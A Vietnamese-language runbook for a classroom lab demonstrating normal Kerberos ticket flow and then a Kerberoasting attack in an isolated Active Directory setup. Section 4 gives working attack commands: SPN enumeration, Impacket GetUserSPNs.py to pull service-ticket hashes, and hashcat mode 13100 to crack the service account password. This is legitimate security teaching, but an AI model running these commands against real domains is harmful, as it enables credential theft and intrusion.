# Runbook demo Kerberos hybrid

## Prerequisites
- Copy thư mục repo này vào host và các máy bạn định thao tác, hoặc ít nhất copy `scripts/` sang DC01 và CL01.
- Lab chuẩn là **2 VM + 1 host crack ngoài lab**:
  - `DC01`: AD DS + DNS + KDC
  - `CL01`: domain client đăng nhập bằng `DEMO\\student`
  - Host crack: máy host Windows/WSL hoặc Kali để chạy Impacket/hashcat
- Luồng bình thường dùng **CIFS tới `\\dc01.demo.local\\SYSVOL`** để nhìn thấy service ticket ổn định.
- Luồng Kerberoasting dùng **SPN của `svc_sql`** để xin TGS và crack offline.

## 1. DC01 setup
Chạy trên DC01 sau khi đã promote domain `demo.local` và reboot:

```powershell
Set-ExecutionPolicy Bypass -Scope Process -Force
. .\scripts\demo-lab-variables.example.ps1
.\scripts\setup-dc01.ps1 -DomainFqdn $DomainFqdn -DomainNetBios $DomainNetBios -StudentPassword $StudentPassword -ServicePassword $ServicePassword -ServiceSpn $ServiceSpn
setspn -L $ServiceUser
```

Expected:
- Tạo được `student`
- Tạo được `svc_sql`
- SPN xuất hiện trong `setspn -L`

## 2. CL01 verify
Chạy trên CL01 sau khi join domain và login `DEMO\\student`:

```powershell
Set-ExecutionPolicy Bypass -Scope Process -Force
. .\scripts\verify-cl01.ps1 -ExpectedDomain demo.local -ExpectedDcHostname DC01
```

Expected:
- Domain check = `PASS`
- TGT present = `PASS`

## 3. Flow Kerberos bình thường
Trên CL01:

```powershell
whoami
klist purge
klist
nslookup demo.local
cmd /c "dir \\dc01.demo.local\SYSVOL"
klist
```

Giải thích lúc demo:
- `\\dc01.demo.local\\SYSVOL` là resource domain user truy cập được ngay
- Đây là luồng **Kerberos bình thường** để nhìn thấy service ticket `cifs/dc01...`
- Luồng này độc lập với `svc_sql`; `svc_sql` chỉ dùng cho phần roast

Expected:
- Trước khi truy cập resource: chủ yếu thấy TGT
- Sau khi truy cập resource: xuất hiện thêm service ticket cho CIFS

## 4. Flow Kerberoasting
Chỉ chạy trong lab cô lập của bạn.

### 4.1 Enumerate SPN bằng công cụ sẵn có trên Windows
Trên CL01:

```powershell
setspn -Q */* | findstr /i svc_sql
```

Expected:
- Thấy `svc_sql` cùng SPN đã gán

### 4.2 Request TGS và xuất hash trên host crack
Ví dụ với WSL/Kali hoặc host có Python + Impacket:

```bash
GetUserSPNs.py demo.local/student:'<LAB_PASSWORD>' -dc-ip 192.168.56.10 -request -outputfile kerberoast.hashes
```

Expected:
- Có file `kerberoast.hashes`
- Có dòng hash dạng `$krb5tgs$`

### 4.3 Crack offline

```bash
hashcat -m 13100 kerberoast.hashes wordlist.txt
```

Expected:
- Crack ra đúng mật khẩu yếu của `svc_sql`

## 5. Nếu live demo lỗi
- Clock skew: trên CL01 chạy `w32tm /resync`, nếu chưa được thì đăng xuất/đăng nhập lại
- DNS/domain join: mở screenshot + video fallback
- Crack chậm: dừng sau 20-30 giây rồi mở output đã chuẩn bị sẵn
